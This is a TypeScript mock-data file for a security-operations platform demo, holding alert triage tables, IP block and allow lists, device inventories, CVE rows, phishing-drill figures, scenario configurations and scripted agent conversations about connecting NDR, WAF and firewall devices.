      { ip: '10.60.2.19', side: '内部', type: '未知办公终端', region: '办公网', asn: 'N/A', intel: '目录枚举', alerts: 76, assets: 18, okCount: 19, sensitiveHits: 8, firstSeen: '13:22', lastSeen: '18:27', topPath: '/upload, /download, /backup.zip', risk: '高', disposition: '转入终端排查' },
      { ip: '10.80.3.77', side: '内部', type: '未知服务器', region: '生产网', asn: 'N/A', intel: '管理端探测', alerts: 39, assets: 8, okCount: 10, sensitiveHits: 5, firstSeen: '14:11', lastSeen: '16:42', topPath: '/jenkins, /admin, /scriptText', risk: '高', disposition: '转入内部威胁研判' },
      { ip: '10.10.5.23', side: '内部', type: '授权扫描器', region: '安全工具区', asn: 'N/A', intel: '周期漏洞扫描', alerts: 412, assets: 96, okCount: 58, sensitiveHits: 21, firstSeen: '02:00', lastSeen: '04:30', topPath: '/login, /swagger-ui, /actuator', risk: '低', disposition: '加入授权扫描器白名单' },
      { ip: '10.10.5.24', side: '内部', type: '授权扫描器', region: '安全工具区', asn: 'N/A', intel: '基线巡检', alerts: 233, assets: 51, okCount: 31, sensitiveHits: 9, firstSeen: '03:00', lastSeen: '05:10', topPath: '/health, /metrics, /config', risk: '低', disposition: '加入授权扫描器白名单' },
    ],
    blockRecommendations: [
      { ip: '45.83.12.21', scope: '边界 FW / WAF', reason: '黑灰产扫描，命中登录口和配置文件路径', evidence: '126 条告警 / 37 次 200 / 12 次敏感命中', action: '加入临时封禁 7 天', priority: '高', owner: '边界安全组' },
      { ip: '185.220.101.47', scope: '边界 FW', reason: 'Tor 出口节点，弱口令和 VPN 登录口探测', evidence: '63 条告警 / 14 次 200 / 7 次敏感命中', action: '加入封禁并开启登录口观察', priority: '高', owner: '办公网安全组' },
      { ip: '193.36.119.42', scope: 'WAF / API 网关', reason: '漏洞扫描基础设施，访问 actuator 和 swagger', evidence: '57 条告警 / 18 次 200 / 6 次敏感命中', action: '封禁并复核 API 暴露面', priority: '高', owner: '应用安全组' },
      { ip: '10.12.8.66', scope: '内网 FW / NAC', reason: '未登记主机发起横向扫描', evidence: '187 条告警 / 44 次 200 / 15 次敏感命中', action: '临时隔离并转入研判', priority: '高', owner: '终端安全组' },
      { ip: '10.60.2.19', scope: '办公网 ACL', reason: '未知办公终端枚举上传和备份路径', evidence: '76 条告警 / 19 次 200 / 8 次敏感命中', action: '限制到生产网访问并排查终端', priority: '高', owner: '办公网安全组' },
    ],
    internalScannerChecklist: [
      { ip: '10.10.5.23', owner: '漏扫平台', status: '已授权', expectedWindow: '每日 02:00-04:30', finding: '任务窗口、源 IP 和扫描范围匹配', nextStep: '加入授权扫描器白名单，保留审计' },
      { ip: '10.10.5.24', owner: '基线巡检', status: '已授权', expectedWindow: '每日 03:00-05:10', finding: '基线巡检任务正常，命中路径以 health/metrics 为主', nextStep: '降低研判优先级，保留趋势' },
      { ip: '10.30.16.8', owner: '红队演练平台', status: '已授权', expectedWindow: '演练窗口 10:00-18:00', finding: '与 Q2 授权攻防演练计划匹配', nextStep: '按演练标签归档，不加入封禁' },
      { ip: '10.12.8.66', owner: '未登记主机', status: '未授权', expectedWindow: '无登记', finding: '横向扫描 33 台资产，命中多个管理后台', nextStep: '转入研判，联动 EDR 拉取进程和登录记录' },
      { ip: '10.60.2.19', owner: '未知办公终端', status: '未授权', expectedWindow: '无登记', finding: '目录枚举和文件上传口探测，行为不符合办公终端基线', nextStep: '通知终端安全组隔离核查' },
      { ip: '192.168.12.45', owner: '测试环境主机', status: '待确认', expectedWindow: '未登记', finding: '脚本探活集中在测试与生产混合网段', nextStep: '补充 owner、任务单和扫描范围' },
      { ip: '10.80.3.77', owner: '未知服务器', status: '未授权', expectedWindow: '无登记', finding: '探测 Jenkins、admin、scriptText 等高敏路径', nextStep: '转入内部威胁研判，必要时临时阻断' },
    ],
  },
  duplicateReport: {
    clusters: 1842,
    dedupKeys: 1023,
    ratio: '64.8%',
    rows: [
      { cluster: 'cluster-1842', title: 'SQL 注入探测', duplicates: 312, source: '45.83.**.21', target: 'api.pay.example.com', pattern: '/v1/user?id=*', firstSeen: '09:12', lastSeen: '14:38' },
      { cluster: 'cluster-2017', title: '后台登录探测', duplicates: 226, source: '多源', target: 'login.shop.example.com', pattern: '/admin*', firstSeen: '10:03', lastSeen: '16:21' },
      { cluster: 'cluster-2216', title: '配置文件探测', duplicates: 144, source: '198.235.**.44', target: 'api.pay.example.com', pattern: '/config*', firstSeen: '11:20', lastSeen: '17:06' },
    ],
  },
  conditionReport: [
    { processType: 'alert_scan_direction_in', count: 2184, explanation: '入站扫描' },
    { processType: 'alert_scan_direction_out', count: 346, explanation: '出站扫描' },
    { processType: 'alert_scan_direction_lateral', count: 898, explanation: '内部横向扫描' },
    { processType: 'alert_not_scan_not_http_direction_in', count: 712, explanation: '非 HTTP 入站告警' },
    { processType: 'alert_not_process', count: 412, explanation: '字段不足或暂不处理' },
  ],
  ruleReport: [
    { id: 'WAF-LOW-001', name: '通用爬虫访问', removed: 264, updatedAt: '2026-06-10', note: '已确认多为搜索引擎' },
    { id: 'NDR-INFO-203', name: 'HTTP 目录枚举', removed: 211, updatedAt: '2026-06-08', note: '未命中敏感路径时压制' },
    { id: 'EDR-WARN-019', name: '运维脚本访问', removed: 153, updatedAt: '2026-06-01', note: '绑定资产标签后压制' },
  ],
  listReport: {
    allow: [
      { object: '10.10.5.23', type: '内部漏扫器', removed: 412, ttl: '长期', note: '授权扫描平台' },
      { object: '66.249.0.0/16', type: '搜索引擎', removed: 118, ttl: '长期', note: 'Googlebot' },
      { object: '220.181.0.0/16', type: '搜索引擎', removed: 106, ttl: '长期', note: 'Baiduspider' },
    ],
    deny: [
      { object: '45.83.**.21', type: '黑灰产 IP', hits: 126, action: '聚合为情报事件', note: '多次探测登录口' },
      { object: 'malicious-ua-x', type: '恶意 UA', hits: 41, action: '转入研判', note: '命中 PoC 扫描' },
    ],
  },
};

export const assetRows = [
  { name: sharedStory.asset, type: 'WAF', region: sharedStory.region, access: 'API + web2cli', risk: '高', status: '已接入' },
  { name: 'FW-HZ-DMZ-01', type: '防火墙', region: sharedStory.region, access: 'API', risk: '中', status: '待绑定巡检' },
  { name: 'NDR-HZ-CORE-01', type: 'NDR', region: '华东一区 / 核心区', access: 'MCP', risk: '低', status: '已接入' },
  { name: 'EDR-MGMT-01', type: 'EDR 管理端', region: '总部 / 管理区', access: 'API', risk: '中', status: '凭证待验证' },
];

export const dataCenterAssets = [
  {
    id: 'beijing',
    name: '北京机房',
    summary: '边界区 / 办公网 / 服务器区',
    devices: [
      { type: 'TDP', name: 'BJ-TDP-01', cpu: 42, memory: 61, disk: 55, alerts: 9836, license: '2026-11-30', intel: 'TDP 情报正常', status: '健康' },
      { type: 'NDR', name: 'BJ-NDR-CORE-01', cpu: 37, memory: 58, disk: 44, alerts: 421, license: '2026-09-18', intel: 'IOC 更新 5分钟前', status: '健康' },
      { type: 'NDR', name: 'BJ-NDR-DMZ-02', cpu: 69, memory: 72, disk: 63, alerts: 812, license: '2026-08-02', intel: 'IOC 更新 12分钟前', status: '关注' },
      { type: 'HIDS', name: 'BJ-HIDS-CLUSTER', cpu: 31, memory: 49, disk: 51, alerts: 188, license: '2027-01-12', intel: '基线库正常', status: '健康' },
      { type: 'EDR', name: 'BJ-EDR-MGMT-01', cpu: 56, memory: 66, disk: 58, alerts: 274, license: '2026-06-30', intel: '样本库正常', status: '健康' },
      { type: 'WAF', name: 'BJ-WAF-DMZ-01', cpu: 63, memory: 70, disk: 47, alerts: 1023, license: '2026-07-15', intel: '规则库正常', status: '关注' },
      { type: '邮件网关', name: 'BJ-MAIL-GW-01', cpu: 28, memory: 52, disk: 61, alerts: 43, license: '2026-12-01', intel: 'URL 情报正常', status: '健康' },
      { type: '防火墙', name: 'BJ-FW-EDGE-01', cpu: 33, memory: 45, disk: 39, alerts: 96, license: '2026-10-20', intel: '不适用', status: '健康' },
    ],
  },
  {
    id: 'hangzhou',
    name: '杭州机房',
    summary: 'DMZ / 核心区 / 支付业务区',
    devices: [
      { type: 'NDR', name: 'NDR-HZ-CORE-01', cpu: 48, memory: 64, disk: 52, alerts: 326, license: '2026-09-01', intel: 'IOC 更新 3分钟前', status: '健康' },
      { type: 'NDR', name: 'NDR-HZ-DMZ-02', cpu: 76, memory: 81, disk: 68, alerts: 694, license: '2026-05-29', intel: 'IOC 更新 8分钟前', status: '关注' },
      { type: 'WAF', name: 'DMZ-WAF-02', cpu: 71, memory: 73, disk: 59, alerts: 126, license: '2026-06-10', intel: '规则库正常', status: '关注' },
      { type: '防火墙', name: 'FW-HZ-DMZ-01', cpu: 39, memory: 57, disk: 41, alerts: 58, license: '2027-02-01', intel: '不适用', status: '健康' },
      { type: 'HIDS', name: 'HZ-HIDS-PAY-CLUSTER', cpu: 44, memory: 60, disk: 66, alerts: 207, license: '2026-12-20', intel: '基线库正常', status: '健康' },
      { type: 'EDR', name: 'HZ-EDR-MGMT-01', cpu: 52, memory: 67, disk: 49, alerts: 133, license: '2026-07-02', intel: '样本库正常', status: '健康' },
      { type: 'TDP', name: 'HZ-TDP-01', cpu: null, memory: null, disk: null, alerts: 0, license: '未接入', intel: '缺失', status: '缺失' },
      { type: '邮件网关', name: 'HZ-MAIL-GW-01', cpu: 30, memory: 50, disk: 43, alerts: 12, license: '2026-10-01', intel: 'URL 情报正常', status: '健康' },
    ],
  },
  {
    id: 'shanghai',
    name: '上海机房',
    summary: '电商业务 / 外联区 / 办公网',
    devices: [
      { type: 'TDP', name: 'SH-TDP-01', cpu: 58, memory: 69, disk: 62, alerts: 2361, license: '2026-08-18', intel: 'TDP 情报正常', status: '健康' },
      { type: 'NDR', name: 'SH-NDR-CORE-01', cpu: 62, memory: 74, disk: 58, alerts: 503, license: '2026-04-20', intel: 'IOC 更新 16分钟前', status: '关注' },
      { type: 'NDR', name: 'SH-NDR-IDC-02', cpu: 41, memory: 55, disk: 46, alerts: 221, license: '2026-11-11', intel: 'IOC 更新 10分钟前', status: '健康' },
      { type: 'WAF', name: 'SH-WAF-DMZ-01', cpu: 66, memory: 75, disk: 60, alerts: 884, license: '2026-09-09', intel: '规则库正常', status: '健康' },
      { type: 'HIDS', name: 'SH-HIDS-CLUSTER', cpu: 35, memory: 53, disk: 57, alerts: 144, license: '2026-12-31', intel: '基线库正常', status: '健康' },
      { type: 'EDR', name: 'SH-EDR-MGMT-01', cpu: 49, memory: 63, disk: 54, alerts: 89, license: '2026-08-30', intel: '样本库正常', status: '健康' },
      { type: '邮件网关', name: 'SH-MAIL-GW-01', cpu: null, memory: null, disk: null, alerts: 0, license: '未部署', intel: '缺失', status: '缺失' },
      { type: '防火墙', name: 'SH-FW-EDGE-01', cpu: 45, memory: 51, disk: 40, alerts: 73, license: '2027-03-15', intel: '不适用', status: '健康' },
    ],
  },
];

export const vulnerabilityRows = [
  { cve: sharedStory.cve, product: '边界 WAF 管理组件', assets: '3 台', confidence: '高', action: '授权验证' },
  { cve: 'CVE-2026-17720', product: 'VPN 网关', assets: '12 台', confidence: '中', action: '补全版本' },
  { cve: 'CVE-2025-49113', product: '邮件网关', assets: '2 台', confidence: '低', action: '人工确认' },
];

export const drillStats = [
  { label: '目标人员', value: '420', hint: '财务、采购、销售三类人群' },
  { label: '预计投递', value: '明日 10:00', hint: '避开月底结算窗口' },
  { label: '审批状态', value: '已通过', hint: '合规、HR、业务负责人已确认' },
  { label: '复盘产出', value: '4 份', hint: '团队报告、个人反馈、课程建议、管理摘要' },
];

export const configBlueprints: Record<ScenarioKey, ScenarioConfig> = {
  alerts: {
    title: '告警运营配置车间',
    goal: '把企业告警源接入 Flocks，并配置可重复执行的降噪、研判、深度调查 SOP。',
    prompt: '我想把 NDR、WAF 和 SIEM 的告警接进来，先自动降噪，再让值班员确认是否进入深度调查。',
    sections: [
      { title: '输入源', description: '先定义告警从哪里来。', items: ['SIEM 事件查询 API', 'NDR 告警订阅', 'WAF 日志检索', '值班群消息入口'] },
      { title: '工具/API/MCP', description: '给 Agent 可调用的上下文能力。', items: ['微步威胁情报', '资产库查询', '日志检索', '工单状态更新'] },
      { title: 'Skills', description: '把企业经验沉淀成操作手册。', items: ['设备字段解释', '误报判定规则', '攻击链映射', '处置规范'] },
    ],
    agents: ['告警降噪 Agent', '研判 Agent', '资产上下文 Agent', '深度调查 Agent', '报告 Agent'],
    workflow: ['接收告警', '聚合事件簇', '补全情报和资产上下文', '给出初判', '人工确认', '深度调查', '生成工单和汇报'],
    outputs: ['事件簇列表', '证据链', '处置建议', '值班摘要', '工单更新'],
  },
  assets: {
    title: '安全设备配置车间',
    goal: '把企业设备按区域、机房、型号和接入方式组织起来，并绑定巡检和攻击面发现。',
    prompt: '我要接入杭州机房两台同型号防火墙，同时配置每日巡检和公网暴露面巡航。',
    sections: [
      { title: '资产模型', description: '让 Flocks 理解企业网络结构。', items: ['企业/区域/机房', '网段和安全域', '设备型号', '多实例命名规则'] },
      { title: '接入方式', description: '不同设备可选不同能力。', items: ['API 凭证', 'web2cli 操作录制', 'MCP 服务', '设备 Skill'] },
      { title: '运维绑定', description: '接入后直接进入可运营状态。', items: ['巡检模板', '配置变更基线', '异常通知通道', '责任人映射'] },
    ],
    agents: ['接入规划 Agent', '凭证校验 Agent', 'web2cli 生成 Agent', '巡检 Agent', '攻击面 Agent'],
    workflow: ['描述设备', '生成接入计划', '验证凭证', '绑定资产分组', '生成巡检任务', '开启异常推送'],
    outputs: ['资产拓扑', '接入清单', '巡检任务', '攻击面监控范围'],
  },
  intel: {
    title: '态势情报配置车间',
    goal: '把威胁情报从资讯流变成每天可执行的资产排查、漏洞验证和值班推送。',
    prompt: '每天早上从微步 MCP 拉取我司行业相关情报，判断是否影响资产，并生成值班群摘要。',
    sections: [
      { title: '关注范围', description: '让情报源知道什么和企业相关。', items: ['行业标签', '关键供应商', '核心资产', '关注软件'] },
      { title: '情报源', description: '接入可调用的情报能力。', items: ['微步 MCP', '漏洞情报 API', 'IOC 查询', 'OSINT 搜索'] },
      { title: '动作转化', description: '把情报转成下一步任务。', items: ['资产影响匹配', '漏洞排查任务', '群推送模板', '周报摘要'] },
    ],
    agents: ['情报筛选 Agent', 'IOC 富化 Agent', '资产影响 Agent', '推送摘要 Agent', '漏洞任务 Agent'],
    workflow: ['定时拉取情报', '按行业过滤', '富化 IOC/CVE', '匹配资产', '生成建议动作', '推送值班群'],
    outputs: ['每日情报摘要', '受影响资产', '排查任务', '群推送文案', '管理周报素材'],
  },
  vulnerabilities: {
    title: '漏洞排查配置车间',
    goal: '把情报、资产指纹和授权验证串成闭环，判断漏洞是否真正影响企业资产。',
    prompt: `排查 ${sharedStory.cve} 是否影响边界资产，验证前先给我执行计划和授权范围。`,
    sections: [
      { title: '影响判断', description: '从情报到资产匹配。', items: ['CVE/软件情报', '软件指纹字段', '资产暴露面', '版本和补丁状态'] },
      { title: '验证控制', description: '验证动作必须可解释、可授权。', items: ['授权范围', '验证方法', '速率限制', '证据留存'] },
      { title: '修复闭环', description: '验证后进入复测和汇报。', items: ['修复工单', '复测 Workflow', '风险接受说明', '管理层摘要'] },
    ],
    agents: ['情报解析 Agent', '资产影响 Agent', '验证规划 Agent', '漏洞验证 Agent', '复测报告 Agent'],
    workflow: ['输入 CVE', '解析影响范围', '匹配资产', '生成验证计划', '人工授权', '执行验证', '生成修复和复测建议'],
    outputs: ['影响资产列表', '验证计划', '证据截图/日志', '修复优先级', '复测结论'],
  },
  drills: {
    title: '钓鱼演练配置车间',
    goal: '把钓鱼演练从模板生成、审批、投递、指标采集到复盘报告做成可控流程。',
    prompt: '为财务和采购团队设计一次发票主题钓鱼演练，先生成审批材料，再安排投递和复盘。',
    sections: [
      { title: '演练范围', description: '先把合规边界说清楚。', items: ['目标人群', '豁免名单', '时间窗口', '审批人'] },
      { title: '投递通道', description: '把邮件或 IM 能力接入演练流程。', items: ['邮件通道', 'IM 通知', '点击采集', '上报入口'] },
      { title: '复盘教育', description: '把结果转成可执行改进。', items: ['团队指标', '个人反馈', '课程推荐', '管理报告'] },
    ],
    agents: ['演练策划 Agent', '模板生成 Agent', '审批材料 Agent', '指标分析 Agent', '复盘报告 Agent'],
    workflow: ['选择目标', '生成模板', '审批确认', '定时投递', '采集行为', '识别高风险人群', '生成复盘'],
    outputs: ['演练方案', '审批记录', '行为指标', '教育建议', '管理摘要'],
  },
  attackSurface: {
    title: '互联网攻击面配置车间',
    goal: '让 Agent 每天发现、归属、解释和验证企业公网暴露面变化。',
    prompt: '基于公司域名、证书和 FOFA 查询，每天发现新增公网资产，并判断是否需要封禁或验证。',
    sections: [
      { title: '发现种子', description: '定义从哪里开始找资产。', items: ['根域名', '组织名', '证书主体', '云账号标签'] },
      { title: '发现能力', description: '组合多种外部数据源。', items: ['FOFA API', '证书透明日志', 'DNS 解析', '端口探测'] },
      { title: '归属与处置', description: '把未知暴露面转成责任和动作。', items: ['CMDB 匹配', 'owner 认领', '风险验证', '每日摘要'] },
    ],
    agents: ['攻击面发现 Agent', '资产归属 Agent', '暴露风险 Agent', '验证规划 Agent', '摘要推送 Agent'],
    workflow: ['加载发现种子', '多源资产发现', '去重和归属', '风险评分', '生成验证计划', '推送变化摘要'],
    outputs: ['新增资产', '暴露服务', '归属建议', '风险解释', '巡航日报'],
  },
};

export const alertConfigModules = [
  {
    title: '告警降噪',
    description: '按机房、设备类型和日志类型配置不同降噪 Workflow。',
    items: [
      { type: 'Workflow', name: '北京机房 TDP Syslog 降噪 Workflow', detail: 'Attack/http 日志，1000/s 速率上限' },
      { type: 'Workflow', name: '北京机房 HIDS 主机告警降噪 Workflow', detail: '进程、登录、文件变更聚合' },
      { type: 'Workflow', name: '杭州机房 NDR 横向扫描降噪 Workflow', detail: '按源 IP、目标网段和时间窗合并' },
      { type: 'Workflow', name: '上海机房 WAF Web 攻击降噪 Workflow', detail: '路径、UA、源地址和规则 ID 聚合' },
      { type: 'Skill', name: '企业误报压制规则 Skill', detail: '白名单、维护窗口、业务探测流量识别' },
    ],
  },
  {
    title: '告警研判',
    description: '不同设备类型使用不同研判 Agent 和上下文工具。',
    items: [
      { type: 'Agent', name: 'NDR 研判 Agent', detail: '网络流量、IOC、东西向访问关系' },
      { type: 'Agent', name: 'HIDS 研判 Agent', detail: '主机进程、登录、文件和计划任务' },
      { type: 'Agent', name: '邮件研判 Agent', detail: '发件人、短链接、附件和投递活动' },
      { type: 'Agent', name: 'EDR 研判 Agent', detail: '终端进程树、文件落地、浏览器历史' },
      { type: 'Tool', name: '微步威胁情报查询 Tool', detail: 'IP、域名、URL、文件 Hash 富化' },
      { type: 'Tool', name: '资产上下文查询 Tool', detail: 'CMDB、owner、安全域、业务系统' },
    ],
  },
  {
    title: '深度调查',
    description: '按设备和特定威胁拆分调查 Agent，支持多源证据链。',
    items: [
      { type: 'Agent', name: 'NDR 深度调查 Agent', detail: '会话、流量、C2、横向移动证据' },
      { type: 'Agent', name: 'EDR 深度调查 Agent', detail: '进程树、命令行、文件和注册表证据' },
      { type: 'Agent', name: 'WAF 深度调查 Agent', detail: '请求链路、规则命中、Payload 还原' },
      { type: 'Agent', name: '邮件深度调查 Agent', detail: '投递范围、短链展开、相似邮件聚类' },
      { type: 'Agent', name: '钓鱼威胁调查 Agent', detail: '邮件、终端、身份、外联闭环分析' },
      { type: 'Agent', name: '银狐威胁调查 Agent', detail: '诱饵文档、远控载荷和持久化排查' },
      { type: 'Agent', name: '勒索软件调查 Agent', detail: '加密行为、横向传播、备份影响评估' },
      { type: 'Agent', name: '挖矿木马调查 Agent', detail: '高负载进程、矿池连接和启动项排查' },
      { type: 'Workflow', name: '多源证据链合并 Workflow', detail: 'NDR/EDR/邮件/OA/CMDB 时间线归并' },
    ],
  },
];

export const alertConnectedDevices = [
  '北京机房 TDP-01',
  '北京机房 HIDS 集群',
  '杭州机房 NDR-HZ-CORE-01',
  '上海机房 WAF-SH-DMZ-02',
  'EDR 管理中心 EDR-MGMT-01',
  '邮件网关 MAIL-GW-01',
  'OA 身份系统 OA-IAM',
  'CMDB 资产库',
];

export const alertBlueprintConversation: BlueprintConversationMessage[] = [
  { role: 'user', sender: '安全运营负责人', time: '14:02', content: '我要把 NDR 的 syslog 告警接进来，先做降噪，再走研判流程，最后输出到企业微信。' },
  { role: 'assistant', sender: 'Rex', time: '14:02', content: '我会先配置 NDR syslog 输入。请到 TDP 控制台中开启 syslog 输出，把日志发送到 Flocks 接收方：IP 10.60.8.21，端口 1514，协议 UDP。过滤条件建议设置为：告警类型 Attack，日志类型 http。' },
  { role: 'tool', sender: 'TDP 接入检查 Tool', time: '14:03', content: '已生成 TDP syslog 输出配置建议：receiver=10.60.8.21:1514，protocol=UDP，facility=local5，filter=alert_type:Attack AND log_type:http。' },
  { role: 'assistant', sender: 'Rex', time: '14:04', content: '接入侧处置速率配置为 1000/s，超过速率的部分会丢弃并记录 drop 计数，避免高峰期拖垮后续研判 Workflow。' },
  { role: 'tool', sender: 'Workflow 配置 Tool', time: '14:05', content: '已创建「北京机房 TDP Syslog 降噪研判 Workflow」，包含 syslog 接收、字段归一化、聚合降噪、NDR 研判、企业微信输出节点。' },
  { role: 'assistant', sender: 'Rex', time: '14:05', content: '你可以到 Workflow 页面查看可视化编排，也可以继续由我补齐输出通道配置。' },
  { role: 'link', sender: 'Rex', time: '14:05', content: '打开 Workflow 页面：/workflows' },
  { role: 'assistant', sender: 'Rex', time: '14:06', content: '现在需要配置企业微信输出。请提供要发送到的企业微信 sessionId。' },
  { role: 'user', sender: '安全运营负责人', time: '14:07', content: 'sessionId 是 ses_ndr_alert_ops_20260523。' },
  { role: 'tool', sender: '企业微信通道 Tool', time: '14:08', content: '已配置输出到企业微信 sessionId=ses_ndr_alert_ops_20260523，消息模板包含事件簇、置信度、推荐动作和 Workflow 链接。' },
  { role: 'assistant', sender: 'Rex', time: '14:09', content: '根据 NDR syslog 来源和资产关系，我推断还需要关联 HIDS、EDR、WAF 设备 ID，用于研判时补充主机、终端和 Web 侧证据。请确认：HIDS-BJ-01、EDR-MGMT-01、WAF-BJ-DMZ-02。' },
  { role: 'user', sender: '安全运营负责人', time: '14:10', content: '确认这三个设备 ID。' },
  { role: 'tool', sender: '设备绑定 Tool', time: '14:11', content: '已绑定 HIDS-BJ-01、EDR-MGMT-01、WAF-BJ-DMZ-02，并写入 NDR 研判上下文。' },
  { role: 'assistant', sender: 'Rex', time: '14:12', content: '全部配置完成：TDP syslog 输入、1000/s 降噪限速、NDR 研判 Workflow、企业微信输出、HIDS/EDR/WAF 设备上下文都已就绪。' },
  { role: 'assistant', sender: 'Rex', time: '14:13', content: '本次配置最终落地为：北京机房 TDP 降噪 Workflow、北京机房 TDP 告警研判 Agent、北京机房 TDP 深度调查 Agent、企业微信通知输出，以及关联的 HIDS/EDR/WAF 设备上下文。后续同类设备可以复制该模板，只替换设备 ID、机房标签和通知 sessionId。' },
];

export const assetWorkshopRows = [
  { type: '防火墙', name: 'FW-HZ-DMZ-01', region: '杭州机房 / DMZ', apiCount: 23, web2cliCount: 1, credential: 'fw_hz_***', status: '已接入' },
  { type: '防火墙', name: 'FW-HZ-DMZ-02', region: '杭州机房 / DMZ', apiCount: 23, web2cliCount: 1, credential: 'fw_hz_***', status: '已接入' },
  { type: 'NDR', name: 'NDR-HZ-CORE-01', region: '杭州机房 / 核心区', apiCount: 18, web2cliCount: 0, credential: 'ndr_hz_***', status: '已接入' },
  { type: 'WAF', name: 'DMZ-WAF-02', region: '杭州机房 / DMZ', apiCount: 31, web2cliCount: 2, credential: 'waf_dmz_***', status: '待补全' },
  { type: 'HIDS', name: 'HZ-HIDS-PAY-CLUSTER', region: '杭州机房 / 支付区', apiCount: 12, web2cliCount: 0, credential: 'hids_pay_***', status: '已接入' },
  { type: 'EDR', name: 'HZ-EDR-MGMT-01', region: '杭州机房 / 终端区', apiCount: 27, web2cliCount: 0, credential: 'edr_hz_***', status: '已接入' },
];

export const assetBlueprintConversation: BlueprintConversationMessage[] = [
  { role: 'user', sender: '安全设备管理员', time: '15:20', content: '我要接入杭州机房两台同型号防火墙，同时配置每日巡检和公网暴露面巡航。' },
  { role: 'assistant', sender: 'Rex', time: '15:20', content: '好的。先确认基础材料：这两台防火墙是否有 API 文档？如果有，请上传文档，我会先评估 API 覆盖范围，再决定哪些能力走 API，哪些能力需要 web2cli。' },
  { role: 'user', sender: '安全设备管理员', time: '15:21', content: '我上传了厂商 API 文档 firewall_api_v6.pdf。' },
  { role: 'tool', sender: 'API 文档解析 Tool', time: '15:22', content: '已解析文档：共发现 93 个 API 接口。与告警研判数据查询相关的接口 21 个，与健康状况查询相关的接口 2 个。未发现 License 授权有效期查询 API，需从 Web 管理页面获取。' },
  { role: 'assistant', sender: 'Rex', time: '15:23', content: '接入计划如下：先生成 21 个告警数据 API 工具，再生成 2 个设备健康巡检 API 工具；License 到期时间通过 web2cli 从管理页面获取。API 工具会按接口一一生成 yml，复杂签名和分页接口会补 helper.py。' },
  {
    role: 'tool',
    sender: 'API 工具生成 Tool',
    time: '15:24',
    content: '开始生成 21 个告警数据 API。每个接口写入一个 yml 文件，复杂接口补充 helper.py。',
    toolCalls: [
      { name: 'write', target: 'firewall/apis/alert_list.yml', status: 'success', result: '写入告警列表查询 API。' },
      { name: 'write', target: 'firewall/apis/alert_detail.yml', status: 'success', result: '写入告警详情查询 API。' },
      { name: 'write', target: 'firewall/apis/traffic_event.yml', status: 'success', result: '写入流量事件查询 API。' },
      { name: 'write', target: 'firewall/apis/attack_event.yml', status: 'success', result: '写入攻击事件查询 API。' },
      { name: 'write', target: 'firewall/apis/policy_hit.yml', status: 'success', result: '写入策略命中查询 API。' },
      { name: 'write', target: 'firewall/apis/threat_ioc_hit.yml', status: 'success', result: '写入威胁情报命中查询 API。' },
      { name: 'write', target: 'firewall/apis/src_ip_profile.yml', status: 'success', result: '写入源 IP画像查询 API。' },
      { name: 'write', target: 'firewall/apis/dst_asset_profile.yml', status: 'success', result: '写入目标资产上下文查询 API。' },
      { name: 'write', target: 'firewall/apis/session_trace.yml', status: 'success', result: '写入会话追踪查询 API。' },
      { name: 'write', target: 'firewall/apis/http_request_log.yml', status: 'success', result: '写入 HTTP 请求日志查询 API。' },
      { name: 'write', target: 'firewall/apis/url_category.yml', status: 'success', result: '写入 URL 分类查询 API。' },
      { name: 'write', target: 'firewall/apis/malware_event.yml', status: 'success', result: '写入恶意文件事件查询 API。' },
      { name: 'write', target: 'firewall/apis/block_action.yml', status: 'success', result: '写入阻断动作查询 API。' },
      { name: 'write', target: 'firewall/apis/rule_detail.yml', status: 'success', result: '写入规则详情查询 API。' },
      { name: 'write', target: 'firewall/apis/geo_location.yml', status: 'success', result: '写入地理位置查询 API。' },
      { name: 'write', target: 'firewall/apis/user_mapping.yml', status: 'success', result: '写入用户映射查询 API。' },
      { name: 'write', target: 'firewall/apis/app_protocol.yml', status: 'success', result: '写入应用协议识别 API。' },
      { name: 'write', target: 'firewall/apis/lateral_scan.yml', status: 'success', result: '写入横向扫描事件查询 API。' },
      { name: 'write', target: 'firewall/apis/top_talkers.yml', status: 'success', result: '写入高频通信实体查询 API。' },
      { name: 'write', target: 'firewall/apis/alert_aggregate.yml', status: 'success', result: '写入告警聚合查询 API。' },
      { name: 'write', target: 'firewall/apis/evidence_bundle.yml', status: 'success', result: '写入证据包查询 API。' },
      { name: 'write', target: 'firewall/apis/helper.py', status: 'success', result: '写入签名计算、分页拉取、时间转换和字段归一化 helper。' },
    ],
  },
  { role: 'tool', sender: 'API 工具生成 Tool', time: '15:25', content: '21 个告警数据 API 已生成并通过 mock 连通性测试。发现 6 个接口依赖 helper.py：签名计算、分页拉取、时间格式转换和字段归一化。' },
  {
    role: 'tool',
    sender: '健康巡检 API Tool',
    time: '15:26',
    content: '生成 2 个设备健康巡检 API，每个接口写入一个 yml 文件。',
    toolCalls: [
      { name: 'write', target: 'firewall/apis/device_health.yml', status: 'success', result: '写入设备健康查询 API，可获取 CPU、内存、磁盘和当前告警量。' },
      { name: 'write', target: 'firewall/apis/interface_status.yml', status: 'success', result: '写入接口状态查询 API，可获取端口 up/down、速率和错误包统计。' },
    ],
  },
  { role: 'assistant', sender: 'Rex', time: '15:27', content: 'API 部分完成。由于文档没有 License 到期接口，需要使用 web2cli。请提供防火墙 Web 管理页面 URL。' },
  { role: 'user', sender: '安全设备管理员', time: '15:28', content: 'URL 是 https://fw-hz-dmz-01.example.local。' },
  { role: 'tool', sender: 'web2cli 浏览器 Tool', time: '15:29', content: '已打开防火墙 Web 管理页面。请在页面完成登录，我会在登录后继续探索 License 授权信息所在位置。' },
  { role: 'assistant', sender: 'Rex', time: '15:30', content: '已检测到登录完成。我开始探索页面结构，目标是找到 License 授权有效期。' },
  {
    role: 'tool',
    sender: 'web2cli 探索 Tool',
    time: '15:32',
    content: '开始探索防火墙 Web 管理页面，目标是找到 License 授权有效期。',
    toolCalls: [
      { name: 'web2cli.click', target: '左侧导航: 系统概览', status: 'success', result: '进入系统概览，仅发现设备型号和运行时长。' },
      { name: 'web2cli.scroll', target: '系统概览页面向下滚动', status: 'success', result: '未发现 License 字段。' },
      { name: 'web2cli.click', target: '顶部页签: 设备信息', status: 'success', result: '发现 SN 和软件版本，但没有授权到期时间。' },
      { name: 'web2cli.click', target: '左侧导航: 网络配置', status: 'success', result: '进入接口配置页面，方向不匹配。' },
      { name: 'web2cli.click', target: '左侧导航: 策略管理', status: 'success', result: '进入安全策略列表，未发现授权信息。' },
      { name: 'web2cli.search', target: '页面搜索框: license', status: 'success', result: '无搜索结果，尝试中文关键词。' },
      { name: 'web2cli.search', target: '页面搜索框: 授权', status: 'success', result: '匹配到系统管理下的授权中心入口。' },
      { name: 'web2cli.click', target: '左侧导航: 系统管理', status: 'success', result: '系统管理菜单展开。' },
